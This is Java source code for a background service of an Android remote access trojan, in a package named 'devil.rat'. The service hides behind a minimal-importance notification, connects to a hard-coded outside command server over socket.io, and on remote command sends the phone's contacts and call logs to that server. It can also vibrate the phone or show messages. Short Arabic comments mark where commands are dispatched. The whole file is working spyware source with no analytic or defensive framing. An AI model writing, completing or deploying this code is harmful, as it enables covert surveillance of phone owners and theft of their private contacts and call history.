package com.devil.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketService extends Service {
    private Socket socket;
    private CommandHandler handler;
    private final String URL = "https://devil-rat-production.up.railway.app";

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new CommandHandler(this);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("rat", "Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            startForeground(1, new NotificationCompat.Builder(this, "rat").setContentTitle("Service").build());
        }

        try {
            socket = IO.socket(URL);
            socket.on(Socket.EVENT_CONNECT, args -> {});
            
            socket.on("commend", args -> {
                try {
                    JSONObject obj = (JSONObject) args[0];
                    String req = obj.getString("request");
                    JSONArray ext = obj.optJSONArray("extras");
                    
                    // تنفيذ الأمر
                    if (req.equals("contacts")) handler.getContacts(socket);
                    else if (req.equals("calls")) handler.getCallLogs(socket);
                    else if (req.equals("vibrate")) handler.vibrate(socket);
                    else if (req.equals("toast")) handler.showToast(socket, ext != null ? ext.getJSONObject(0).getString("value") : "");
                    // ... باقي الأوامر في CommandHandler
                    
                } catch (Exception e) {}
            });
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
                }
